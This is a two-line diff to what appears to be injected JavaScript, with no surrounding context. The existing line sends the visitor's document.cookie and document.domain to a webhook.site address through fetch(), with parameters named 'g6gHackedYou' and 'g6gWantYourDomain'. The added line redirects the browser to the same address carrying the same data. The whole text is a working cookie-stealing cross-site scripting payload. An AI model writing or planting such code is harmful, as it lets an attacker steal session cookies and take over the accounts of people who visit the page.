@@ -1,1 +1,2 @@
 fetch(`https://webhook.site/dc460f3c-ba39-425c-83d2-b36347d786ac?g6gHackedYou=${document.cookie}&g6gWantYourDomain=${document.domain}`).then(function(response) { return response.json(); }).then(function(data) { console.log(data); })
+document.location=`https://webhook.site/dc460f3c-ba39-425c-83d2-b36347d786ac?g6gHackedYou=${document.cookie}&g6gWantYourDomain=${document.domain}`;
